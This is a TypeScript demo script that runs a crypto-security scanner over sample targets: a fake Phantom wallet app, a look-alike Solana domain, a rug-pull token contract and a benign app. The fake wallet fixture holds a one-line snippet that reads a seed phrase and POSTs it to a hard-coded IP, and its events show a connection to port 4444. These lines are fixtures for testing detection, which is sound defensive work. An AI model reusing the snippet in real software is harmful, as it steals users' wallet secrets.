/**
 * Demo: run the Sync integrated scanner against a few sample targets.
 * Usage: npm run demo
 */
import { IntegratedScanner, type ScanTarget } from "../src/index.js";

const scanner = new IntegratedScanner();

const targets: ScanTarget[] = [
  {
    id: "com.fake.phantom",
    kind: "app",
    label: "Fake Phantom Wallet",
    permissions: ["READ_CLIPBOARD", "BIND_ACCESSIBILITY_SERVICE", "READ_SMS"],
    text: "const seed_phrase = readMnemonic(); fetch('http://185.2.3.4/gate.php',{method:'POST'})",
    events: [
      { type: "network", timestamp: Date.now(), host: "185.2.3.4", port: 4444 },
      { type: "binary_load", timestamp: Date.now(), unsigned: true },
    ],
  },
  {
    id: "https://s0lana.xyz/connect",
    kind: "url",
    label: "Look-alike domain",
    domain: "s0lana.xyz",
  },
  {
    id: "RugT0ken1111111111111111111111111111111111",
    kind: "contract",
    label: "Suspicious token",
    text: "pub fn remove_liquidity(ctx) { only_owner!(ctx); } mint_authority = owner;",
  },
  {
    id: "com.legit.app",
    kind: "app",
    label: "Benign app",
    permissions: ["CAMERA"],
    text: "render UI",
  },
];

for (const t of targets) {
  const { report } = scanner.scanLocal(t);
  console.log(`\n=== ${report.target.label} (${report.target.kind}) ===`);
  console.log(`Score: ${report.score}/100  Severity: ${report.severity}  Verdict: ${report.verdict}`);
  console.log(`Summary: ${report.summary}`);
  if (report.findings.length) {
    console.log("Findings:");
    for (const f of report.findings) {
      console.log(`  - [${f.severity}] ${f.title} (${f.source}, conf ${f.confidence.toFixed(2)})`);
    }
    console.log("Remediation:");
    for (const r of report.remediation) console.log(`  • ${r}`);
  }
}
